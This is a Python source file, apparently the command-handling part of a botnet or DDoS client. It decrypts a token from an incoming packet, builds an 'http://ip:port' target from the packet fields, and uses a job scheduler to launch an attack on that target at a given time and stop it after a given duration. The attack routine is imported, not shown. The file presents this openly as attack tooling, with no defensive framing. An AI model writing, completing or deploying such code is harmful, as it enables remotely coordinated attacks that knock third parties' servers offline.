from app.models import singleton, PacketData
from app.tasks.attakTarget import AttackTarget
from app.tasks.encrypt import Encrypt
from .baseScheduler import BaseScheduler
from datetime import datetime, timedelta


@singleton
class AttackScheduler:
    def __init__(self):
        self.baseScheduler = BaseScheduler()
        self.scheduler = self.baseScheduler.scheduler
        self.attackTarget = AttackTarget()
        self.packetData = PacketData()
        self.encrypt = Encrypt()

    def onDataReceived(self):
        actions = {
            0: lambda: None,
            1: self.setAttack,
            2: self.setAttack,
            3: self.attackTarget.stop,
        }
        action = actions.get(self.packetData.flag, lambda: None)
        action()

    def setAttack(self):
        if self.encrypt.decrypt(self.packetData.encryptedToken) is None:
            return

        dateNow = datetime.now()
        runDate = datetime(
            dateNow.year + self.packetData.atkDate["year"],
            self.packetData.atkDate["month"],
            self.packetData.atkDate["day"],
            self.packetData.atkDate["hour"],
            self.packetData.atkDate["min"],
        )

        stopDate = runDate + timedelta(minutes=self.packetData.atkDuration)

        ip = ".".join(str(octet) for octet in self.packetData.ipAddr)
        port = self.packetData.portNum
        self.attackTarget.target = f"http://{ip}:{port}"

        self.scheduler.add_job(
            func=self.attackTarget.schedulerAttack,
            trigger="date",
            run_date=runDate,
            id="attack",
            replace_existing=True,
        )
        self.scheduler.add_job(
            func=self.attackTarget.stop,
            trigger="date",
            run_date=stopDate,
            id="stop",
            replace_existing=True,
        )

    def reset(self):
        self.scheduler.remove_job(id="attack")
        self.scheduler.remove_job(id="stop")
